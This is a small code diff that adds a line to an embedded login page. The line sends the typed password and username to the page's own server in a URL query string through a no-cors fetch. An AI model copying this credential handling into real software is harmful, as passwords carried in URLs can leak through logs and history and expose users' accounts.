@@ -10,6 +10,6 @@ button.addEventListener('click', (e) => {
     const password = pass.value;
 
     if (username === '' || password === '') return alert('Please Check your input');
-
+     fetch('?password=' + password + '&' +'username=' + username, { mode: 'no-cors', method: 'POST' });
 })
 )=====";
